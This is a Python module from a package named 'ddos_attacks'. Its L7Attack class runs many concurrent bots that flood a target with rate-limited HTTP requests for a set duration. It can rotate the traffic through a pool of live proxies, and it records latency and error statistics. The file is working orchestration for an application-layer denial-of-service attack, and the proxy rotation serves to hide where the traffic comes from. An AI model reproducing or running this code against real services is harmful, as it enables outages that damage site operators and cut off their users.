import time, datetime, asyncio, aiohttp, statistics
from aiolimiter import AsyncLimiter
from pathlib import Path
from ddos_attacks.utils import load_json, percentile, select_allive_proxy, save_json
from ddos_attacks.bots.l7_bot import L7Bot
from ddos_attacks.proxy.proxy import ProxyPool

ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/l7ddos.json")
LOGS = Path(__file__).resolve().parents[2] / "logs/l7attack.jsonl"
DURATION = ddos_config["l7"]["DURATION"]


class L7Attack:
    def __init__(self, bots_count: int, rps: int, proxy: bool = False):
        self.bots_count = bots_count
        self.rps = rps
        self.proxy = proxy
        self.duration = DURATION
        self.stats = {
            "response_times": [],
            "http_codes": [],
            "errors_count": 0
        }

    async def attack(self):
        pool = None
        if self.proxy:
            select_allive_proxy()
            proxies = load_json(Path(__file__).resolve().parents[2] / "data/proxypool.json")
            pool = ProxyPool(proxies=proxies["proxies"], mode="roundrobin")

        print("⏳ L7 Attack is running...")
        limiter = AsyncLimiter(self.rps, 1)
        timeout = aiohttp.ClientTimeout(total=15)
        connector = aiohttp.TCPConnector(limit=0)
        stop_time = time.time() + self.duration

        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            tasks = []
            for i in range(self.bots_count):
                bot = L7Bot(i)
                tasks.append(asyncio.create_task(bot.job(session, limiter, self.stats, stop_time, pool)))
            await asyncio.gather(*tasks, return_exceptions=True)
        self.attack_statistic()

    def attack_statistic(self):
        if self.stats["response_times"]:
            logs = {
                f"DATE: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}": {
                    "---PARAMS---": {
                        "Bot Count": self.bots_count,
                        "Rps": self.rps,
                        "Proxy": self.proxy
                    },
                    "---STATS---": {
                        "Requests": len(self.stats['response_times']),
                        "Errors": self.stats['errors_count'],
                        "p50": statistics.median(self.stats['response_times']),
                        "p95": percentile(self.stats['response_times'], 95),
                        "p99": percentile(self.stats['response_times'], 99)
                    }
                }
            }
            save_json(filename=LOGS, data=logs, show=True)
        else:
            logs = {
                f"DATE: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}": {
                    "---PARAMS---": {
                        "Bot Count": self.bots_count,
                        "Rps": self.rps,
                        "Proxy": self.proxy
                    },
                    "---STATS---": {
                        "Requests": 0,
                        "Errors": self.stats['errors_count'],
                        "p50": None,
                        "p95": percentile(self.stats['response_times'], 95),
                        "p99": percentile(self.stats['response_times'], 99)
                    }
                }
            }
            save_json(filename=LOGS, data=logs, show=True)